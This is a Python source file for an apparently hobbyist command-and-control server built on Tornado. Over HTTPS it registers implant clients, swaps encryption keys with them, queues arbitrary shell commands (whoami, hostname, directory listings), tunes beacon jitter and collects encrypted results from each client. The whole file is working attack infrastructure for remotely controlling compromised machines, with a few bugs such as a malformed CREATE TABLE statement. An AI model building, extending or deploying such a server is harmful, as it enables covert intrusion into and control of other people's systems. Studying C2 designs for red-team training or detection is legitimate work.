import tornado.ioloop
import tornado.web
import tornado.httpserver
import asyncio
import threading
from encryption import AESCipher
import urllib.parse
from datetime import datetime, timedelta
import ssl
import random
import string
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES,PKCS1_OAEP
import base64
import logging
import os
import sqlite3

# Generate log files and settings for general logging
# We put logs in an individual directory each time the server is launched
launch_time = datetime.now()
log_base_dir = "logs"
log_dir = f"{log_base_dir}/{launch_time.year}-{launch_time.month}-{launch_time.day}-{launch_time.hour}:{launch_time.minute}"
try:
    os.mkdir(log_dir)
except FileExistsError:
    pass

general_log_file = "general.log"
logging.basicConfig(format= '%(asctime)s %(message)s',filename=f"{log_dir}/{general_log_file}",level=logging.DEBUG)

# Set General logging to also go to the console
console = logging.StreamHandler()
console.setLevel(logging.WARNING)
formatter = logging.Formatter('%(message)s')
console.setFormatter(formatter)
logging.getLogger().addHandler(console)

# Empty clients dictionary to reference and add too later
clients = {}

# Name for the sqlite3 database
db_name = "c2-clients.db"

# Certificate files for SSL communciation
certfile = "/home/jhicks/certs/ssl.pem"
keyfile = "/home/jhicks/certs/ssl.key"

class Database():
    """
    Class for handling the database
    The database is used for persistence across reboots or in the case the server crashes
    """
    def __init__(self, db_filename):
        self.db_filename = db_filename
        db_exists = self.check_if_db_exists()
        if not db_exists:
            self.create_db()
        elif db_exists != 'SQLite format 3\x00':
            logging.error(f"Database file {self.db_filename} exists, but is not an SQLite3 database: {db_exists}")
            exit(-1)
        else:
            self.load_db()

    def check_if_db_exists(self):
        if not os.path.isfile(self.db_filename):
            return False
        if os.path.getsize(self.db_filename) < 100:
            return "Wrong Filetype"

        with open(self.db_filename, 'rb') as db_file:
            header = db_file.read(100)
        try:
            header = header[:16].decode('utf-8')
        except:
            return header

        return header



    def create_db(self):
        logging.info("Database does not exist, creating new database")
        conn = sqlite3.connect(self.db_filename)
        cursor = conn.cursor()
        cursor.execute("CREATE TABLE c2_clients id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT")
        conn.commit()
        conn.close()

    def load_db(self):
        print("The database exists, so we would load it")

class Client():
    def __init__(self, id, ip_address, pub, key):
        self.id = id
        self.command_queue = []
        self.last_seen = datetime.now()
        self.command_history = []
        self.add_command("whoami")
        self.add_command("hostname")
        self.public_key = pub
        self.key = key
        self.cipher = AESCipher(self.key)
        self.whoami = None
        self.hostname = None
        self.next_update_time = 0
        self.ip_address = ip_address

    def get_commands(self):
        return self.command_queue

    def add_command(self, command):
        self.command_queue.append(command)

    def update_last_seen(self):
        self.last_seen = datetime.now()
        if not self.whoami:
            if len(self.command_history) > 0:
                self.whoami = self.command_history[0][2]

        if not self.hostname:
            if len(self.command_history) > 1:
                self.hostname = self.command_history[1][2]

    def set_next_update(self, jitter):
        self.next_update_time = datetime.now() + timedelta(seconds=int(jitter))

    def clear_commands(self):
        self.command_queue = []

    def add_history(self, command, result):
        self.command_history.append((datetime.now(), command, result))

    def view_history(self, mode="all", command_number=0):
        if mode == "all":
            for command in self.command_history:
                print(f"({command[0]}): {command[1]} - {command[2]} ")
        if mode == "list":
            counter = 0
            for command in self.command_history:
                print(f"[{counter}]: {command[1]}")
                counter += 1
        if mode == "select":
            try:
                command = self.command_history[command_number]
            except:
                print("Invalid command number. Please choose one from the following list")
                self.view_history(mode="list")
                return -1
            print(f"{command[0]}: {command[1]}\r\n{command[2]}")




    def view_queue(self):
        for command in self.command_queue:
            print(f"{command}")

class MainHTTP(tornado.web.RequestHandler):
    def get(self):
        self.write('Hello World');

class RegisterClient(tornado.web.RequestHandler):
    def get(self):
        client_pub = self.get_arguments("key")
        client_ip = self.request.remote_ip
        if len(client_pub) != 1:
            logging.warning(f"A connection was received from {client_ip}, but they did not include a public key")
        else:
            client_id = get_random_string(16)
            sym_key = get_random_string(16, expanded=True)
            clients[client_id] = Client(client_id, client_ip, client_pub[0], sym_key)
            key = RSA_encrypt(client_id + sym_key, base64.b64decode(client_pub[0]))
            print(len(key))
            self.write(base64.b64encode(key).decode('utf-8'))
            logging.info(f"Client from {client_ip} connected and was assigned an ID of {client_id}")

class ClientCommand(tornado.web.RequestHandler):
    def get(self):
        client_id = self.get_arguments("id")
        client_jitter = self.get_arguments("jit")[0]
        if len(client_id) != 1 or client_id[0] not in clients.keys():
            logging.warning(f"Client ID of {client_id} connected and is invalid")
        else:
            client_id = client_id[0]
            client = clients[client_id]
            client.update_last_seen()
            client.set_next_update(client_jitter)
            commands = client.get_commands()
            if len(commands) == 0:
                #print(f"Client {client_id} connected, but no commands were waiting for them")
                return None
            else:
                commands = "////".join(commands)
                logging.info(f"[{client_id} - {client.hostname}/{client.whoami}] - {commands}")
                commands = client.cipher.encrypt(commands)
                client.clear_commands()
                self.write(commands)

class ClientResponse(tornado.web.RequestHandler):
    def get(self):
        #print("In ClientResponse get()")
        client_id = self.get_arguments("id")

        if len(client_id) != 1 or client_id[0] not in clients.keys():
            logging.warning(f"Client ID of {client_id} connected and is invalid")
        else:
           #print(f"Recieving response from {client_id}")
            client_id = client_id[0]
            client = clients[client_id]
            response = self.get_arguments("response")
            response = response.pop()
            #print(response)
            print(f"Client {client_id} responded with:")
            response = urllib.parse.unquote(response)
            response = client.cipher.decrypt(response)
            response = response.split("////")
            command = response[0]
            result = response[1]
            print(f"{command}: {result}")
            logging.info(f"[{client_id} {client.hostname}/{client.whoami}]: {command} - {response}")
            client.add_history(command, result)
            client.update_last_seen()

def RSA_encrypt(data, recipient_public):
    recipient_key = RSA.import_key(recipient_public)
    session_key = get_random_bytes(16)
    data = data.encode('utf-8')
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_session_key = cipher_rsa.encrypt(session_key)
    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(data)
    return enc_session_key + cipher_aes.nonce + tag + ciphertext

def list_clients():
    '''Lists the clients currently connected to the C2 server.'''
    counter = 0
    for client in clients.keys():
        client = clients[client]
        next_update_in = client.next_update_time - datetime.now()
        if next_update_in < timedelta(seconds = 0):
            next_update_in = "Client Lost"
        last_seen = datetime.now() - client.last_seen
        #Remove microseconds from displaying, because we don't care about microseconds
        #If you care about microseconds, just comment out this line.
        last_seen = last_seen - timedelta(microseconds=last_seen.microseconds)
        print(f"[{counter}] {client.id} - ({client.ip_address}){client.hostname}/{client.whoami} (last seen: {last_seen}) (next update: {next_update_in})")
        counter += 1

def interact_with_client(client_id):
    try:
        client_id = int(client_id)
    except:
        print("Invalid Client Selection")
        return
    if len(clients) < client_id -1:
        print("Invalid Client Selection")
    else:
        client_id = list(clients.keys())[client_id]
        client = clients[client_id]
        command = None
        print("Input commands to send to client. use 'back' to go back to main menu")
        while command != "back":
            command = input(f"{client_id}> ")
            if command == "":
                pass
            elif command.split()[0] == "listdir":
                if len(command.split()) < 2:
                    print("Usage: listdir <directory>")
                else:
                    client.add_command(f"::::listdir {command.split()[1]}")
            elif command.split()[0] == "jitter":
                if len(command.split()) != 3:
                    print("Jitter Syntax: jitter <low time> <high time>")
                else:
                    client.add_command(f"::::adj_jitter {command.split()[1]} {command.split()[2]}")
            elif command.split()[0] == "history":
                if len(command.split()) == 1:
                    client.view_history()
                elif len(command.split()) == 2:
                    if command.split()[1] == "list":
                        client.view_history(mode="list")
                    else:
                        show_history_usage()
                elif len(command.split()) == 3:
                    if command.split()[1] == "show":
                        try:
                            command_number = int(command.split()[2])
                        except:
                            print(f"Invalid command number: {command.split()[2]}")
                            show_history_usage()
                            continue
                        client.view_history(mode="select", command_number=command_number)
                    else:
                        show_history_usage()
            elif command != "back":
                client.add_command(command)

def get_client_history(client_number):
    try:
        client_id = int(client_number)
        client_id = list(clients.keys())[client_id]
    except:
        print("Invalid Client Selection")

    client = clients[client_id]
    client.view_history()

def get_client_queue(client_number):
    try:
        client_id = int(client_number)
        client_id = list(clients.keys())[client_id]
    except:
        print("Invalid client selection")
    client = clients[client_id]
    client.view_queue()

def start_listener(port, applications):
    logging.info("Starting listener application")
    ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_ctx.load_cert_chain(certfile, keyfile)
    asyncio.set_event_loop(asyncio.new_event_loop())
    http_server = tornado.httpserver.HTTPServer(applications, ssl_options=ssl_ctx)
    http_server.listen(port)
    tornado.ioloop.IOLoop.instance().start()

def get_random_string(length, expanded=False):
    letters = string.ascii_lowercase
    if expanded:
        letters += string.ascii_uppercase
        letters += string.digits
    result = ''.join(random.choice(letters) for i in range(length))
    return result

def show_history_usage():
    print("Usage:")
    print("history\tShows all commands and results")
    print("history list\tShows all commands with numbers for selection")
    print("history show <command number>\tShows the result of a specific command")
#client_db = Database(db_name)

if __name__ == "__main__":
    print("Welcome to My First C2 Server!")
    commands = ("list", "interact", "history", "jitter", "queue")
    applications = tornado.web.Application([(r"/", RegisterClient),
                                            (r"/register", RegisterClient),
                                            (r"/command", ClientCommand),
                                            (r"/response", ClientResponse),
                                            ])
    listen_port = 8888
    threading.Thread(target=start_listener, args=(listen_port, applications)).start()
    print("Waiting for a client to connect ....")
    while len(clients) == 0:
        pass
    while 1:
        command = input("c2> ").split()
        if not command:
            pass
        elif command[0] not in commands:
            print("Invalid command")
        else:
            if command[0] == "list":
                list_clients()
            elif command[0] == "interact":
                if len(command) < 2:
                    print("Please specify a client number")
                    list_clients()
                else:
                    interact_with_client(command[1])
            elif command[0] == "history":
                if len(command) < 2:
                    print("Please specify a client number")
                    list_clients()
                else:
                    get_client_history(command[1])
            elif command[0] == "jitter":
                if len(command) != 4:
                    print("Jitter syntax: jitter <client_number> <jitter_low> <jitter_high>")
                else:
                    client_id = list(clients.keys())[int(command[1])]
                    client = clients[client_id]
                    jlo = command[2]
                    jhi = command[3]
                    client.add_command(f"::::adj_jitter {jlo} {jhi}")
            elif command[0] == "queue":
                if len(command) < 2:
                    print("Please specify a client number")
                    list_clients()
            else:
                get_client_queue(command[1])